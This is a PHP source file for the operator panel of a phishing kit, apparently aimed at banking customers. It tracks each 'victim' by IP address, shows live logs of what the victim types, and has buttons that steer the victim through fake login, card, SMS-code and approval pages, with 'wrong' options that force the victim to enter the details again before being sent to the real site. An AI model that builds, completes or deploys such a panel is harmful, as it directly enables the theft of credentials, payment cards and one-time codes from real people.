<link rel="shortcut icon" type="image/png" href="res/3132165.png">
<?php 
session_start();
require "classes/mother.class.php";
if(!isset($_GET['vip']) OR empty($_GET['vip'])){
	exit("INVALID REQUESTS. PLEASE ACCESS THIS PAGE FROM A VALID LINK");
}

$m = new Mother;
$ip = @$_GET['vip'];
@$m->setDataFile("data/vics/VIC-$ip.json");

if(@$m->getData()["CURRENT_PAGE"]==null){
	exit("<h2>Victim not found. please try an ip address you already receieved in yout results.</h2>");
}

$last_act = $m->getData()["LAST_ACT"];
$ip =  $m->getData()["IP"];
$cp = $m->getData()["CURRENT_PAGE"];
$logs = $m->getData()["LOGS"];
$customMessage = isset($m->getData()["CUSTOM_MESSAGE"]) ? $m->getData()["CUSTOM_MESSAGE"] : "";

?>
<!doctype html>
<html>
<head>
<title><?php echo $ip; ?></title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
<link rel="stylesheet" href="res/app.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"/>
<script src="res/jq.js"></script>
</head>
<body>
<div class="header">
<div class="left">
<i class='fa fa-user'></i> Welcome, <b> <?php echo substr(PNL_USERNAME, 0, 8);?></b>
</div>
<div class="right">
<button onclick="window.location='settings.php';"><i class='fa fa-home'></i>Settings </button>
</div>
</div>
<div class="content">
<div class="holder">
<div class="multi">
<div class="box1" id="statu" style="background:<?php if($last_act  > (time() - 5)){
		echo '#1bc81b';
	}else{
		echo '#b60f0f';
	} ?>">
<div class="rows-holder">
<div class="row">VICTIM IP: <?php echo $ip; ?> </div>
</div>
</div>

<div class="box">
<div class="title">CURRENT PAGE</div>
<div class="content" id="current_page">
<?php 
if(strpos($cp, "LOADING")!==false and $last_act  > (time() - 5)){
echo "<b style='color:red;'>Victim waiting for redirection... <br> $cp</b>";	
}else{
	echo $cp;
}
?>
</div>
</div>
<div class="box">
<div class="title">REDIRECTS</div>
<div class="content">
<div style="margin-bottom: 10px;">
    <input type="text" id="custom_message" placeholder="Enter custom message" value="<?php echo htmlspecialchars($customMessage); ?>" style="width: 100%; padding: 8px;">
    <button onclick="saveMessage()" style="margin-top: 5px;">Save 💾</button><button onclick="redirect(1)"> Show ⌯⌲</button>
    <div id="current_server_message" style="margin-top: 5px; font-size: 12px; color: #666;">
        Current saved message: <span><?php echo htmlspecialchars($customMessage); ?></span>
    </div>
</div>
</div>
<button onclick="redirect(2)">LOGIN ✅</button>
<button onclick="redirect(3)">CARD ✅</button>
<button onclick="redirect(4)">WORNG CARD ❌</button>
<button onclick="redirect(5)">SMS ✅</button>
<button onclick="redirect(6)">WORNG SMS ❌</button>
<button onclick="redirect(7)">APPROVE 🔄</button>
<button onclick="redirect(8)">WORNG APPROVE❌</button>
</div>

<div class="box">
<div class="title">VICTIM LOGS</div>
<div class="content">
<textarea id="data" readonly><?php echo "\n".$logs; ?></textarea>
</div>
</div>
<div class="box">
<div class="title">ACTIONS</div>
<div class="content">
<button onclick="redirect(20)"> OFFICIAL WEBSITE 🚫<i class='fa-solid fa-arrow-right'></i> </button>
<h2 style="text-align: center;"><img alt="" src="https://cdn-icons-png.flaticon.com/128/4712/4712139.png" style="width: 35px; height: 35px;" /></h2>
</div>
</div>
</div>
</div>

<div class="loader" id="loader" style="display:none;">
<i class="fa fa-clock"></i> Redirecting...
</div>
<div class="loader" id="loader-adding" style="display:none;">
<i class="fa fa-clock"></i> Adding...
</div>
<div class="loader-error" id="errorbox" style="display:none;">
<i class="fa fa-ban"></i> <span id="error-msg"></span>
</div>
<div class="loader" id="successbox" style="display:none;">
<i class="fa fa-circle-check"></i> <span id="success-msg"></span>
</div>
<div class="loader-error" id="loader-error" style="display:none;">
<i class="fa fa-ban"></i> Victim is not connected
</div>
</div>


<div class="footer">
<div class="info">Live Control Panel Premium</div>
</div>
<script>
var vic_statu = "off";
var ip = "<?php echo $ip; ?>";
var isInputFocused = false;

// Track when the input field is focused or not
document.getElementById('custom_message').addEventListener('focus', function() {
    isInputFocused = true;
});

document.getElementById('custom_message').addEventListener('blur', function() {
    isInputFocused = false;
});

function redirect(page){
	if(vic_statu=="on"){
	$("#loader").show().delay(3000).fadeOut();
	$.post("classes/processor.php", 
	{pageID:page, vicIP:ip} );
	}else{
		 $("#loader-error").show().delay(2000).fadeOut();
	}
}

function saveMessage(){
    var message = $("#custom_message").val();
    $("#loader-adding").show().delay(1500).fadeOut();
    $.post("classes/processor.php", 
    {saveCustomMessage: 1, message: message, vicIP: ip},
    function(response){
        showSuccess("Message saved successfully!");
        // Update the current server message display
        $("#current_server_message span").text(message);
    });
}

var textarea = document.getElementById('data');
var last_data = "";

setInterval(function(){
	$.post("classes/processor.php", {getVictimData:1, vip:ip}, 
	function(done){	
		const data = JSON.parse(done);
			if(data.page && data.page.includes('LOADING')==true && data.statu=="on"){
				$("#current_page").html("<b style='color:red;'>Victim waiting for redirection... <br>"+data.page+"</b>");
			}else if(data.page){
			    $("#current_page").html(data.page);
			}

		$("#data").val(data.data);
		if(last_data != data.data){
			textarea.scrollTop = textarea.scrollHeight;
		}
		last_data = data.data;
		
		vic_statu = data.statu;
		
		if(data.statu=="on"){
			$("#statu").css("background","#1bc81b");
		}else{
			$("#statu").css("background","#b60f0f");
		}

        // Only update the current server message display, not the input field if user is typing
        if(data.custom_message !== undefined){
            // Update the display of the current server message
            $("#current_server_message span").text(data.custom_message);
            
            // Only update the input field if it's not currently focused
            if(!isInputFocused) {
                $("#custom_message").val(data.custom_message);
            }
        }
	});
}, 1000);


function showError(msg){
	$(".loader").hide();
	$(".loader-error").hide();
	$("#error-msg").html(msg);
	 $("#errorbox").show().delay(2000).fadeOut();
}
function showSuccess(msg){
	$(".loader").hide();
	$(".loader-error").hide();
	$("#success-msg").html(msg);
	 $("#successbox").show().delay(2000).fadeOut();
}


function logout(){
	window.location="index.php?logout";
}
</script>
</body>
</html>